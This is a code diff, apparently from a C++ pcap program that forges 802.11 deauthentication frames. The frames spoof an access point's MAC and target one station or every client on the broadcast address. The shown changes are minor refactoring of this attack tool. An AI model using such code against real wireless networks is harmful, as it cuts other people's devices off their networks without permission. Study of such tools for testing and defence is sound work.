@@ -22,6 +22,7 @@ typedef struct DeauthFrame {
 	uint16_t reason;
 } DF;
 
+/*
 ostream& operator<<(ostream& os, const Mac& mac){
 	return os<<std::string(mac);
 }
@@ -37,6 +38,7 @@ ostream& operator<<(ostream& os,const map<Mac, BEdata>& data){
 	
 	return os;
 }
+*/
 
 
 int main(int argc, char* argv[]){
@@ -51,7 +53,8 @@ int main(int argc, char* argv[]){
     char *dev = argv[1];
 	
     Mac ap = Mac(argv[2]);
-    Mac station = (argc==4 ? Mac(argv[3]) : isBroadcast()); //Mac ("FF:FF ~")
+    //Mac station = (argc==4 ? Mac(argv[3]) : Mac::broadcastMac()); //Mac ("FF:FF ~")
+    Mac station = (argc == 4 ? Mac(argv[3]) : Mac("FF:FF:FF:FF:FF:FF"));
 	
     char errbuf[PCAP_ERRBUF_SIZE];
 
@@ -73,10 +76,10 @@ int main(int argc, char* argv[]){
 	packet.deauth.subtype = Deauthentication;
 	packet.deauth.flags = 0;
 	packet.deauth.duration = 314; //microseconds
-	packet.deauth.destMac = station;
-	packet.deauth.srcMac = ap;
+	packet.deauth.destMAC = station;
+	packet.deauth.srcMAC = ap;
 	packet.deauth.BSSID = ap;
-	packet.seq_ctl = 0;
+	packet.deauth.seq_ctl = 0;
 
 	packet.reason = ReceivedFromNonassociatedStation;
 
